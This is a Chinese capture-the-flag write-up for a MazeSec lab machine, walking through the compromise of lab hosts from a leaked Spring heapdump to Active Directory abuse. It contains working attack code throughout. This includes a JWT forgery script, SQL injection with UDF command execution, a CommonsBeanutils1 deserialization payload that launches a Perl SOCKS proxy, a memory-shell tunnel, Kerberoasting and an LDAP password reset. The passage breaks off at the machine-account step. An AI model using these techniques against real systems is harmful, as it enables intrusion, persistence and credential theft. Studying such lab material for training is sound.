> 来源：MazeSec
>
> 靶机ID：825
>
> 靶机难度：Hard
>
> 靶机作者：MJ
>
> 宿主：`192.168.205.128`
>
> 靶机：`192.168.205.151`
>
> 辅助AI：deepseek-v4.1-flash
>
> 修订于 2026-11-22

> **引用与致谢**：本文若干小节（JDumpSpider、MemShellParty + Suo5、NetExec、bloodyad、Heimdal kinit + MIT kvno、socat ProxyCommand 等）参考 Sublarge 的同题 Writeup。这些方法、命令和思路属于 Sublarge 的学习资产；本文只做整理、对照和扩展，并在相关段落注明出处

## Flag

| Flag | 值                                              | 位置                                                     |
| ---- | ----------------------------------------------- | -------------------------------------------------------- |
| user | `LAB{6ce1e052d435f0e80b2ad9b471619b0f8620f75c}` | `db:/root/57adc4b24a5c03b47689b521da74a9afuser/user.txt` |
| root | `LAB{4e2450db9d7bdfe7c3c3b307f2369e26a6e4b3aa}` | `dc01:/root/root.txt`                                    |

## 攻击链

```text
1  nmap → 22/8080
2    └─ /actuator/heapdump 未授权 → JWT secret / DB 凭据 / 二因子通行密钥
3         └─ 伪造 ADMIN JWT → /admin/report/search SQLi
4              └─ MySQL root + sys_eval UDF → db 容器 root → user flag
5                   └─ CommonsBeanutils1（BeanComparator + TemplatesImpl）→ app RCE
6                        └─ 停 Tomcat Connector + Perl SOCKS（或 MemShellParty + Suo5，保留 8080 HTTP）→ 172.31.20.0/24
7                             └─ SMB null session 枚举 → 111（no preauth）/ lemon（MSSQLSvc SPN）
8                                  └─ Kerberoasting without preauth → lemon:xiyiwi
9                                       └─ BloodHound / 原始 ACL：lemon ForceChangePassword→yliken；yliken WriteProperty→DC01$
10                                           └─ yliken 加机器账号 EVIL2$，写 RBCD
11                                                └─ MIT kvno S4U2Self/S4U2Proxy → Administrator cifs/dc01
12                                                     └─ host/dc01 + GSSAPI SSH root（/root/.k5login）→ root flag
```

> **路径选择**：第 6 步的“停 Connector + Perl SOCKS”和 5.2 的 MemShellParty + Suo5 互斥。若要保留 8080 的 HTTP 接口（SQLi、静态文件回显、`/admin/report/search`），先走 5.2；不要先停 Connector。

## 一、信息收集

目标主机是 `192.168.205.151`。全端口扫描结果很干净，只有两个对外开放端口：

```bash
nmap -p0-65535 192.168.205.151
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

MAC Address: 08:00:27:C0:2E:C0 (Oracle VirtualBox virtual NIC)
```

22 端口是靶机的 `OpenSSH_10.0p2 Debian-7+deb13u4`，本链没有用到；实际入口是 8080 的 **MazeSec 报表工作台**。

```bash
curl -s -i http://192.168.205.151:8080/
```

应用指纹：

```text
Spring Boot 2.7.18
Tomcat 9.0.83
JDK 8u504
MySQL 5.7.44
```

前端和接口枚举得到：

```text
/api/auth/register
/api/auth/login
/api/auth/me
/admin/report/search
/admin/key/challenge
/admin/key/verify
/actuator/health
/actuator/heapdump
```

`/actuator/env`、`/actuator/beans`、`/actuator/mappings` 都是 404，但 **`/actuator/heapdump` 未授权可下载**。这是整题的第一把钥匙。

```bash
curl -s -m 120 -o heapdump.hprof \
  http://192.168.205.151:8080/actuator/heapdump

ls -lh heapdump.hprof
file heapdump.hprof
```

```text
-rw-r--r-- 1 kali kali 24M ...
Java HPROF dump
```

## 二、heapdump 里的凭据

先从 HPROF 中提取字符串和 `lab.ctf` 类实例。注意 Java 的 `String` 在 dump 里经常是 UTF-16，直接用 `strings` 可能截断最后一个字符；建议用专门的 HPROF 解析器（`jhat`、Eclipse MAT 或自写解析脚本），或者同时看普通 `strings` 和 `strings -el`，并用实际 JWT 签名/登录校验取到的值。

```bash
strings -n 6 heapdump.hprof > hprof_strings.txt
strings -el -n 6 heapdump.hprof > hprof_utf16.txt
grep -aiE 'jwt|secret|jdbc|mysql|passphrase|key' hprof_strings.txt hprof_utf16.txt | head -50
```

如果不想自己写解析器，可以用 Sublarge 在 Writeup 中使用的 **JDumpSpider**（建议 JDK 8；新版 JDK 也能运行）。它会把 heapdump 里的 `DataSource`、`PropertySource`、`UserPassSearcher` 等分类摊开，JDBC/密码/口令一眼可见。下载和运行：

```bash
# 从 JDumpSpider Releases 下载（版本号可按最新 release 替换）
curl -L -o JDumpSpider.jar \
  https://github.com/whwlsfb/JDumpSpider/releases/download/dev-20250409T071858/JDumpSpider-1.1-SNAPSHOT-full.jar

# 建议用 JDK 8；新版 JDK 也能运行
java -version
java -jar JDumpSpider.jar heapdump.hprof > jdumpspider.txt
```

重点看输出里的 `OriginTrackedMapPropertySource`、`UserPassSearcher` 和 `AdminController`：

```text
OriginTrackedMapPropertySource
  lab.db.url = jdbc:mysql://db:3306/ctf_lab?allowMultiQueries=true...

UserPassSearcher
  lab.ctf.AuthController: [dbUser = root, ..., dbPassword = lemonsseecc]
  lab.ctf.AdminController: [dbUser = root, passphrase = BuildingMaintenance2026!, ..., dbPassword = lemonsseecc]
```

HMAC 密钥一般不在这些字段里，再用 `export-strings` 导出全部字符串后 grep：

```bash
java -jar JDumpSpider.jar heapdump.hprof export-strings
# 它会打印：Output to: ./<随机数字>.txt
grep -aE '0x[0-9a-zA-Z]+' <随机数字>.txt | sort -u | head -30
grep -a '0x64sdas55xad888al' <随机数字>.txt
```

关键结果：

| 项目           | 值                                                           |
| -------------- | ------------------------------------------------------------ |
| JWT HS256 密钥 | `0x64sdas55xad888al`                                         |
| JDBC           | `jdbc:mysql://db:3306/ctf_lab?allowMultiQueries=true`        |
| DB 账号        | `root:lemonsseecc`                                           |
| 二因子通行密钥 | `BuildingMaintenance2026!`                                   |
| 关键类         | `lab.ctf.AdminController`、`JwtService`、`LabKey`、`RuntimeConnectorRegistry` |

`JwtService` 的常量池里直接能看到签名密钥：

```text
0x64sdas55xad888al
```

## 三、伪造 JWT 进入后台

注册普通用户只会得到 `role=USER` 的 token，访问 `/admin/*` 返回 403。JWT 的 claim 里真正生效的是 `sub` 和 `role`，把 `role` 改成 `ADMIN` 即可。

```python
import hmac, hashlib, base64, json, time

def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def sign(payload, key):
    h = b64(json.dumps({"alg": "HS256", "typ": "JWT"},
                       separators=(',', ':')).encode())
    p = b64(json.dumps(payload, separators=(',', ':')).encode())
    sig = hmac.new(key.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64(sig)}"

tok = sign({
    "sub": "admin",
    "role": "ADMIN",
    "exp": int(time.time()) + 86400
}, "0x64sdas55xad888al")

print(tok)
open("admin_tok.txt", "w").write(tok)
```

验证：

```bash
TOK=$(cat admin_tok.txt)
curl -s -H "Authorization: Bearer $TOK" \
  'http://192.168.205.151:8080/admin/report/search?q=1'
```

## 四、SQL 注入到 db 容器 root

`/admin/report/search` 的 `q` 参数存在三列联合注入：

```text
q=1' UNION SELECT 1,2,3-- -
```

先确认文件读取是否可用：

```sql
x' UNION SELECT 1,@@secure_file_priv,3-- -
```

如果返回 `NULL`，说明 `LOAD_FILE` 被禁用，只能走 UDF；如果不为 `NULL` 且 `File_priv=Y`，也可以直接 `LOAD_FILE('/root/.../user.txt')` 读取，省去注册 UDF。

另外，`/admin/report/search` 对单行输出有 2047 字符上限（返回 `truncated: true`）。读长文件时用 `SUBSTRING(..., offset, 1900)` 分块。这个上限最好在停 Connector 之前验证，否则第 6 步之后接口已经不可用。

数据库连接串带 `allowMultiQueries=true`，可以堆叠查询。MySQL 进程是 root，镜像里已经有 `lib_mysqludf_sys.so`；本题注册 `sys_eval` 即可。镜像只导出了 `sys_eval`，`sys_exec` 并不存在，尝试注册会报 `ERROR 1127 Can't find symbol 'sys_exec' in library`：

```sql
x'; CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';-- -
```

如果返回 `Function 'sys_eval' already exists`，说明之前已经注册过，忽略即可，直接使用。

确认：

```sql
x' UNION SELECT 1,group_concat(concat(name,'@',dl)),3 FROM mysql.func-- -
```

```text
sys_eval@lib_mysqludf_sys.so
```

命令执行封装：

```bash
q() {
  curl -s -H "Authorization: Bearer $(cat admin_tok.txt)" \
    --get --data-urlencode "q=$1" \
    http://192.168.205.151:8080/admin/report/search
}

q "x' UNION SELECT 1,sys_eval('id; uname -n'),3-- -"
```

结果：

```text
uid=0(root) gid=0(root) groups=0(root)
docker2
```

如果镜像里没有 `hostname` 命令，用 `uname -n` 或 `cat /etc/hostname` 即可；不要因为 `hostname` 空输出怀疑 UDF 没执行。

`docker2` 是 db 容器，user flag 在：

```text
/root/57adc4b24a5c03b47689b521da74a9afuser/user.txt
```

读取：

```bash
q "x' UNION SELECT 1,sys_eval('cat /root/57adc4b24a5c03b47689b521da74a9afuser/user.txt'),3-- -"
```

```text
LAB{6ce1e052d435f0e80b2ad9b471619b0f8620f75c}
```

另外，db 容器的 `/opt/ctf/employee_accounts.xlsx` 也可读，里面是员工姓名和职位列表，可作为后续用户名枚举的补充，但不含密码。

## 五、CommonsBeanutils1 打 app RCE，拿 SOCKS 跳板

app 的 `/admin/key/verify` 会把 `key` cookie 做原生 Java 反序列化：

```text
Cookie: key=rO0ABXNyAA5sYWIuY3RmLkxhYktleQ...
```

`rO0AB` 是 Java 序列化流。堆里确认 classpath 有：

```text
commons-beanutils-1.9.4.jar
commons-collections-3.2.2.jar
tomcat-embed-core-9.0.83.jar
```

`commons-collections 3.2.2` 对 `InvokerTransformer` / `InstantiateTransformer` 的 `readObject` 做了安全限制，CC1/3/5/6/7 不能直接复用。`commons-beanutils 1.9.4` 的 `BeanComparator` 本身没有这层限制，标准 `CommonsBeanutils1` 仍然可用；真正需要注意的是 JDK 8 的 `AbstractTranslet.postInitialization()`：自定义 translet 如果没有设置 `transletVersion`，会去读为 null 的 `namesArray`，抛 NPE。只要在 translet 构造函数里加一行 `transletVersion = 101;` 即可。用 ysoserial 的 `CommonsBeanutils1` 也可以，但默认 `StubTransletPayload` 会在命令执行后于 `postInitialization` 处 NPE，表现为 500；命令通常已经执行。想避免这个异常，换成设置了 `transletVersion = 101` 的自定义 translet。

- `TemplatesImpl` 承载 `MyTranslet8.class`
- `PriorityQueue` + `BeanComparator("outputProperties")` 触发 getter
- `TemplatesImpl._bytecodes` 写入 translet 字节码

translet 用 JDK 8 编译（class 版本 52），核心骨架：

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import java.io.*;
import java.nio.file.*;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class MyTranslet8 extends AbstractTranslet {
    private static final String SOCKS_B64 = "<gzip+base64 后的 socks.pl>";
    public MyTranslet8() { transletVersion = 101; }   // 关键：避免 postInitialization 空指针

    static {
        // 1. 停掉当前 Tomcat Connector，释放 8080
        // 2. 把 gzip + base64 的 socks.pl 写到 /tmp/socks.pl
        // 3. 启动 perl /tmp/socks.pl 8080
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
}
```

核心生成逻辑：

```java
TemplatesImpl t = new TemplatesImpl();

Field nf = TemplatesImpl.class.getDeclaredField("_name");
nf.setAccessible(true);
nf.set(t, "Pwnr");

Field bf = TemplatesImpl.class.getDeclaredField("_bytecodes");
bf.setAccessible(true);
bf.set(t, new byte[][]{Files.readAllBytes(Paths.get("MyTranslet8.class"))});

Field tf = TemplatesImpl.class.getDeclaredField("_tfactory");
tf.setAccessible(true);
tf.set(t, new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());

PriorityQueue<Object> q =
    new PriorityQueue<>(2, new BeanComparator("outputProperties"));

Field qf = PriorityQueue.class.getDeclaredField("queue");
qf.setAccessible(true);
qf.set(q, new Object[]{t, t});

Field sf = PriorityQueue.class.getDeclaredField("size");
sf.setAccessible(true);
sf.setInt(q, 2);
```

发送：

```bash
AT=$(cat admin_tok.txt)
C=$(base64 -w0 translet_payload.bin)

curl -s -o /dev/null -w 'http=%{http_code}\n' \
  -X POST \
  -H "Authorization: Bearer $AT" \
  -H "Cookie: key=$C" \
  -d "passphrase=BuildingMaintenance2026!" \
  "http://192.168.205.151:8080/admin/key/verify"
```

`http=000` 是正常现象：translet 在请求处理过程中停掉了 Tomcat 的 Connector，所以 HTTP 连接会断。`/admin/key/verify` 对正常 `LabKey` 会校验 challenge nonce（一次性，重复使用或篡改返回 403）；但反序列化发生在类型校验之前，gadget 不需要有效 nonce，执行后因不是 `LabKey` 抛 `ClassCastException`，通常表现为 500，不要把 500 当成失败。

注意 Tomcat 默认 `max-http-header-size=8192`。序列化对象经 base64 后如果超过约 8 KB，会先收到 `400 Bad Request`，此时 Connector 还在，可以压缩脚本或分块写入。把 Perl 脚本 gzip 后嵌入，通常能把 payload 控制在 4~5 KB。

translet 做三件事：

```java
// 1. 停掉当前 Tomcat Connector，释放 8080
Class<?> c = Class.forName(
    "lab.ctf.RuntimeConnectorRegistry", true,
    Thread.currentThread().getContextClassLoader());
Object conn = c.getMethod("getActiveConnector").invoke(null);
if (conn != null) {
    conn.getClass().getMethod("stop").invoke(conn);
}

// 2. 把 gzip + base64 的 socks.pl 解码写到 /tmp/socks.pl
byte[] gz = Base64.getDecoder().decode(SOCKS_B64);
GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(gz));
ByteArrayOutputStream out = new ByteArrayOutputStream();
byte[] buf = new byte[4096];
int n;
while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
in.close();
Files.write(Paths.get("/tmp/socks.pl"), out.toByteArray());

// 3. 启动 Perl SOCKS5
Runtime.getRuntime().exec(new String[]{
    "/bin/sh", "-c",
    "sleep 2; setsid perl /tmp/socks.pl 8080 >/tmp/socks.log 2>&1 &"
});
```

`/tmp/socks.pl` 是纯 Perl 的 SOCKS5 服务，监听 `0.0.0.0:8080`。一个最小实现如下，保存后可以直接 `perl -c` 检查：

```perl
use IO::Socket::INET;
use IO::Select;

my $s = IO::Socket::INET->new(
    LocalAddr => "0.0.0.0", LocalPort => 8080,
    Listen => 20, ReuseAddr => 1
) or die $!;

while (my $c = $s->accept) {
    my $pid = fork();
    if ($pid) { close($c); next; }
    close($s);
    my $buf;
    sysread($c, $buf, 2);
    my $n = ord(substr($buf, 1, 1));
    sysread($c, $buf, $n);
    syswrite($c, "\x05\x00");

    sysread($c, $buf, 4);
    my ($ver, $cmd, $rsv, $atyp) = unpack("C4", $buf);
    my $host;
    if ($atyp == 1) {
        sysread($c, $buf, 4);
        $host = join('.', unpack('C4', $buf));
    } elsif ($atyp == 3) {
        sysread($c, $buf, 1);
        my $l = ord($buf);
        sysread($c, $buf, $l);
        $host = $buf;
    } else {
        syswrite($c, "\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00");
        close($c);
        exit;
    }

    sysread($c, $buf, 2);
    my $port = unpack("n", $buf);
    my $u = IO::Socket::INET->new(
        PeerAddr => $host, PeerPort => $port, Timeout => 5
    );
    if (!$u) {
        syswrite($c, "\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00");
        close($c);
        exit;
    }
    syswrite($c, "\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00");

    my $sel = IO::Select->new($c, $u);
    while (my @r = $sel->can_read(300)) {
        for my $fh (@r) {
            my $b;
            my $n = sysread($fh, $b, 8192);
            exit if !$n;
            my $o = ($fh == $c) ? $u : $c;
            syswrite($o, $b);
        }
    }
    exit;
}
```

确认代理：

```bash
cat /tmp/pc.conf
# socks5 192.168.205.151 8080

proxychains4 -f /tmp/pc.conf nc -z -w3 dc01.corp.local 88
proxychains4 -f /tmp/pc.conf nc -z -w3 db 3306
```

网络拓扑：

```text
Kali        192.168.205.128
靶机入口     192.168.205.151:8080
app         172.31.10.10 / 172.31.20.10
db          172.31.10.20
dc01        172.31.20.20
```

app 是双网卡，只有它能同时访问 `172.31.10.0/24` 和 `172.31.20.0/24`，所以必须从 app 起 SOCKS；db 没有到 `172.31.20.0/24` 的路由。

### 5.1 Sublarge 的 ysoserial 写法（静态文件回显）

如果不使用上面的“停 Connector + Perl”，Sublarge 的两种写法更推荐。Sublarge 不手写 Java 生成器，直接用 ysoserial 的 `CommonsBeanutils1`。先用一个短命令确认 RCE：

```bash
java -jar ysoserial-all.jar CommonsBeanutils1 \
  'cp /etc/hosts /app/classes/static/hosts.txt' > cb1.ser
```

把 `cb1.ser` base64 后放进 `key` Cookie，带上 `passphrase=BuildingMaintenance2026!` 发给 `/admin/key/verify`。默认 translet 执行完命令后会在 `postInitialization` 抛出 NPE，HTTP 返回 500；**500 是成功**，去看静态文件：

```bash
curl -s http://192.168.205.151:8080/hosts.txt
```

如果命令里有管道、重定向，`Runtime.exec(String)` 会按空白切词，Sublarge 的办法是先用 Base64 包一层，再让 bash 做 brace expansion：

```text
bash -c {echo,BASE64}|{base64,-d}|{bash,-i}
```

这样 ysoserial 只看到 `bash`、`-c`、`{echo,BASE64}|{base64,-d}|{bash,-i}` 三个参数，管道由 bash 自己展开。**这套 ysoserial + 静态文件回显 + 无空格 bash 的写法来自 Sublarge 的 Writeup。**

### 5.2 Sublarge 的 MemShellParty Valve + Suo5 隧道

如果打算走这条路线，**不要先执行第 6 步的“停 Tomcat Connector”**，两者互斥。Sublarge 更推荐用 MemShellParty 在 8080 上挂一个 Tomcat Valve 内存马，再用 Suo5 通过 HTTP 开正向 TCP 隧道；这样不用停 Connector，SQLi 和静态文件回显都还能继续用。

先确认 CLI/后端和枚举值：

```bash
# 安装 CLI；没有全局权限时把下面的 memparty 换成 npx -y memshell-party-cli
npm install -g memshell-party-cli

memparty version
# CLI:    0.8.1
# Server: 3.1.0

memparty config tools Tomcat | grep Suo5
# Suo5: Listener, JakartaListener, Filter, ..., Valve, ...
```

生成命令：

```bash
memparty gen -s Tomcat -t Suo5 -y Valve -p DefaultBase64 --jdk 8 \
  --header-name Referer --header-value 'http://mazesec.local/' \
  --injector-class-name lab.ctf.Suo5Inj -o Suo5Inj.class --json
```

输出关键字段：

```text
shellClassName = org.apache.http.web.handlers.batching.AlternativeSubscriptionValve
shellSize      = 17782
headerName     = Referer
headerValue    = http://mazesec.local/
outputFile     = Suo5Inj.class (24752 bytes)
```

`shellClassName`、`shellSize` 和最终文件大小每次生成都会随机变化，上面的数值只是示例，不要用固定值做判断。

`Suo5Inj.class` 是 **injector**，`file` / `javap` 显示 class 版本 52（Java 8）；真正的 Suo5 Valve 类名是随机生成的 `shellClassName`，被 injector 内嵌。`Suo5` 在 MemShellParty v3 里就是原来的 Suo5v2 协议。生成物先在本地 Tomcat 9.0.83 + JDK 8 验证过：把 `Suo5Inj.class` 放到 `WEB-INF/classes/lab/ctf/`，JSP 执行 `Class.forName("lab.ctf.Suo5Inj").newInstance()` 后，`memparty connect -t suo5` 返回 `suo5 v2 handshake ok`，`suo5` 客户端 SOCKS 测试也能通。

`Suo5Inj.class` 要落到 Web classpath。`Runtime.exec` 不经过 shell 时无法做重定向，所以先用 base64 分块追加，再用 shell 解码；注意 GNU `base64` 没有 `-o` 选项，必须用 stdout 重定向：

```text
bash -c {echo,-n,CHUNK}>>/tmp/i.b64
mkdir -p /app/classes/lab/ctf
bash -c 'base64 -d /tmp/i.b64 > /app/classes/lab/ctf/Suo5Inj.class'
```

最后一条必须作为完整的 `-c` 参数交给 shell。如果 translet 用的是按空白切词的 `Runtime.exec(String)`，应改成数组形式：

```java
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c",
    "base64 -d /tmp/i.b64 > /app/classes/lab/ctf/Suo5Inj.class"});
```

写入是异步的：在 `Class.forName` 之前对 `Runtime.exec` 返回的 `Process` 调用 `waitFor()`，或至少 sleep 一两秒，确认 class 已经解码落地。

**不要用 `java -cp /app/classes X` 另起 JVM。** `Suo5Inj` 的构造器会扫描 `ContainerBackgroundProcessor` 线程并取 Tomcat Context；独立 JVM 没有这个线程，只会输出 `context not found`，不会注册 Valve。必须在 Tomcat 进程内加载 injector。最省事的是复用 `/admin/key/verify` 的反序列化入口，在 translet 的 static 块里执行：

```java
Class.forName("lab.ctf.Suo5Inj", true,
    Thread.currentThread().getContextClassLoader())
    .getConstructor().newInstance();
```

也可以把同样的调用放进 JSP 或其他能在 Tomcat JVM 内执行的加载器。`java -cp` 只能用于本地 Tomcat 测试，不能用于目标机。

注入后先握手验证：

```bash
memparty connect -u http://192.168.205.151:8080/ -t suo5 \
  --header-name Referer --header-value 'http://mazesec.local/'
# OK   suo5 http://192.168.205.151:8080/
#      suo5 v2 handshake ok (session ...)
```

客户端：

```bash
# 下载客户端（版本可换）
curl -L -o suo5-linux-amd64 \
  https://github.com/zema1/suo5/releases/download/v2.2.0/suo5-linux-amd64
chmod +x suo5-linux-amd64

./suo5-linux-amd64 -t http://192.168.205.151:8080/ \
  -H 'Referer: http://mazesec.local/' \
  -l 127.0.0.1:1080 --no-gzip -d
```

`proxychains` 指到本地 1080，关闭 `proxy_dns`：

```ini
strict_chain
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
```

域名写进 `/etc/hosts`，KDC 写 IP，`krb5.conf` 里 `udp_preference_limit = 1`，否则 AS-REQ 走 UDP 会在代理上黑洞：

```text
172.31.20.20 dc01.corp.local corp.local CORP.LOCAL DC01
172.31.10.20 db
```

这样 8080 仍然是 HTTP，SQLi、`/app/classes/static/` 回显、`/admin/report/search` 都还能继续用；比“停 Connector + Perl SOCKS”更优雅、更可控。**MemShellParty + Suo5 的整套思路和参数来自 Sublarge，本文只是按本机目标改写。**

## 六、域信息收集

通过 SOCKS 扫描 dc01：

```bash
proxychains4 -f /tmp/pc.conf nmap -sT -Pn -p22,53,88,135,139,389,445,464,636,3268,3269 172.31.20.20
```

如果 nmap 经 proxychains 把端口都标成 `filtered`，可以改用 `proxychains4 nc -z -w2` 逐端口确认；部分环境下 nmap 的 connect 扫描和 proxychains 配合不稳定。

实际开放：

```text
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
```

**没有 5985/47001（WinRM）**，也没有 593；464（kpasswd）和 3269（LDAPS GC）实际开放。后面的横向不是 WinRM，而是 Kerberos + SSH。

域信息：

```text
Domain : corp.local
DC     : dc01.corp.local (172.31.20.20)
OS     : Samba 4.22.11-Debian
```

### 6.1 SMB null session

SMB 允许匿名会话，`rpcclient` 可以直接枚举域用户：

```bash
proxychains4 -f /tmp/pc.conf rpcclient -U "" -N dc01.corp.local -c "enumdomusers"
```

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[111] rid:[0x44f]
user:[lemon] rid:[0x450]
user:[yliken] rid:[0x451]
...
```

LDAP 匿名 bind 本身可以成功，但匿名 search 会被 Samba 拒绝：

```text
LDAP: error code 1 - 00002020: Operation unavailable without authentication
```

所以用户枚举走 SMB null session，后续 LDAP 查询用 `lemon` 的凭据。

Samba 的 389 端口对简单绑定要求加密，后续改密和 RBCD 写入都走 LDAPS 636；`ldap3` 侧用 `Tls(validate=0)` 处理自签证书。

两个关键对象：

| 账号    | 属性                                           |
| ------- | ---------------------------------------------- |
| `111`   | `UF_DONT_REQUIRE_PREAUTH`，可无预认证发 AS-REQ |
| `lemon` | SPN `MSSQLSvc/dc01.corp.local:1433`            |

### 6.2 用 NetExec 枚举用户（Sublarge 的做法）

Sublarge 用 NetExec 替代 `rpcclient`，一条命令就能拿到 SMB 信息和用户列表：

```bash
proxychains4 -f /tmp/pc.conf nxc smb 172.31.20.20
proxychains4 -f /tmp/pc.conf nxc smb 172.31.20.20 --users
```

输出里能看到 Samba 4.22、`signing:True`、`Null Auth:True`，以及 `Administrator`、`111`、`lemon`、`yliken` 等账号。`--users` 的结果可以直接整理成 `users.txt`，供后面的 `GetNPUsers` 或用户名枚举使用。**这个枚举方式来自 Sublarge 的 Writeup。**

## 七、Kerberoasting without preauthentication

先用 `GetNPUsers -request` 确认 `111` 的 no-preauth 属性：

```bash
proxychains4 -f /tmp/pc.conf impacket-GetNPUsers \
  CORP.LOCAL/111 -request -no-pass \
  -dc-ip dc01.corp.local -format hashcat
```

它返回的是 `111` 自己的 AS-REP TGT，rockyou 跑不出来；`111` 的正确用法不是烤它自己的密码，而是把它当作 **no-preauth 的 client principal**，用 AS-REQ 的 `sname` 直接请求 `lemon` 的服务票。

较新的 impacket（0.13.x 起）的 `getKerberosTGT` 已经支持 `serverName` 和 `kerberoast_no_preauth`：

```python
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REP
from pyasn1.codec.der import decoder
import binascii

spn = "MSSQLSvc/dc01.corp.local:1433"
client = Principal("111", type=constants.PrincipalNameType.NT_PRINCIPAL.value)

tgt, cipher, key, session = getKerberosTGT(
    client,
    "",
    "CORP.LOCAL",
    b"",
    b"\x00" * 16,
    "",
    "dc01.corp.local",
    True,        # request PAC
    spn,         # sname
    True,        # kerberoast_no_preauth
)

asrep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
etype = int(asrep["ticket"]["enc-part"]["etype"])
cipher_bytes = bytes(asrep["ticket"]["enc-part"]["cipher"])

print("etype =", etype, "len =", len(cipher_bytes))
print("$krb5tgs$23$*lemon$CORP.LOCAL$%s*$%s$%s" % (
    spn,
    binascii.hexlify(cipher_bytes[:16]).decode(),
    binascii.hexlify(cipher_bytes[16:]).decode(),
))
```

如果所用 impacket 支持 `GetUserSPNs -no-preauth`，也可以不写脚本：

```bash
impacket-GetUserSPNs 'CORP.LOCAL/' \
  -no-preauth 111 \
  -usersfile <(echo 'MSSQLSvc/dc01.corp.local:1433') \
  -dc-ip 172.31.20.20 -dc-host dc01.corp.local \
  -request
```

注意 `-usersfile` 本来接收的是用户名列表，这里把 SPN 当用户名是一种“碰巧可用”的写法；输出会是：

```text
$krb5tgs$23$*MSSQLSvc/dc01.corp.local:1433$CORP.LOCAL$MSSQLSvc/dc01.corp.local~1433*$...
```

hash 里的 username 字段是 SPN，而不是 `lemon`；这不影响 hashcat 13100 用服务账号密钥破解，但不要把它当成 `lemon` 的显示名。稳定做法仍是上面的自定义 `getKerberosTGT(..., serverName=SPN, kerberoast_no_preauth=True)`。

提取 `$krb5tgs$23$...`，hashcat 13100：

```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

```text
lemon : xiyiwi
```

验证：

```bash
proxychains4 -f /tmp/pc.conf rpcclient \
  -U 'CORP\lemon%xiyiwi' -W CORP dc01.corp.local -c "getusername"
```

```text
Account Name: lemon, Authority Name: CORP
```

## 八、BloodHound / 原始 ACL：从 lemon 到 DC01$

用 `lemon` 收集 BloodHound（Samba 上可能失败；失败就直接看下面的 raw LDAP）：

```bash
proxychains4 -f /tmp/pc.conf bloodhound-python \
  -u lemon -p xiyiwi \
  -d corp.local \
  -ns 172.31.20.20 \
  -dc dc01.corp.local \
  --dns-tcp \
  -c All --zip
```

Samba 4.22 上 `bloodhound-python` 的 LDAP bind 经常直接失败（`LDAPSessionTerminatedByServerError`），`--use-ldaps` 也不一定解决，`--ldap-channel-binding` 还要求 patched ldap3。不要卡在 BloodHound 上，直接用 LDAPS + ldap3 简单绑定读取 `nTSecurityDescriptor`。注意必须带 SD flags 控制，否则 `raw_values` 是空的：

```python
from ldap3 import Server, Connection, Tls, NONE, BASE
server = Server("dc01.corp.local", port=636, use_ssl=True,
                get_info=NONE, tls=Tls(validate=0))
conn = Connection(server, user="lemon@corp.local", password="xiyiwi",
                  authentication="SIMPLE", auto_bind=True)
conn.search("CN=yliken,CN=Users,DC=corp,DC=local", "(objectClass=*)",
            search_scope=BASE, attributes=["nTSecurityDescriptor"],
            controls=[("1.2.840.113556.1.4.801", True, b"\x30\x03\x02\x01\x04")])
raw = conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
```

`1.2.840.113556.1.4.801` 是 `LDAP_SERVER_SD_FLAGS_OID`，值 `30 03 02 01 04` 表示取 DACL；拿到 raw 后用 `impacket.ldap.ldaptypes.SR_SECURITY_DESCRIPTOR` 解析成 ACE。

关键 ACE：

```text
lemon  --ForceChangePassword-->  yliken
yliken --WriteProperty (GenericWrite)-->  DC01$
```

含义：

1. `lemon` 可以重置 `yliken` 的密码
2. `yliken` 对域控计算机对象 `DC01$` 有 `WriteProperty`（工具通常显示为 `GenericWrite`）
3. 可以写 `DC01$` 的 `msDS-AllowedToActOnBehalfOfOtherIdentity`，即 **RBCD**
4. `yliken` 还能在 `CN=Computers` 下创建机器账号（CreateChild），所以下面可以直接 `impacket-addcomputer`；`DC01$` 的 `WriteProperty` 则用于写 RBCD 属性。

### 8.1 重置 yliken 密码

通过 LDAPS 636 修改 `unicodePwd`：

```python
import ldap3

server = ldap3.Server("dc01.corp.local", port=636, use_ssl=True, get_info=ldap3.NONE,
                      tls=ldap3.Tls(validate=0))
conn = ldap3.Connection(
    server,
    user="lemon@corp.local",
    password="xiyiwi",
    authentication=ldap3.SIMPLE,
    auto_bind=True,
)

new = "Yliken123!"
pwd = ('"' + new + '"').encode("utf-16-le")

ok = conn.modify(
    "CN=yliken,CN=Users,DC=corp,DC=local",
    {"unicodePwd": [(ldap3.MODIFY_REPLACE, [pwd])]},
)
print(ok, conn.result.get("description"), conn.result.get("message"))
```

新凭据：

```text
yliken : Yliken123!
```

### 8.2 加机器账号

```bash
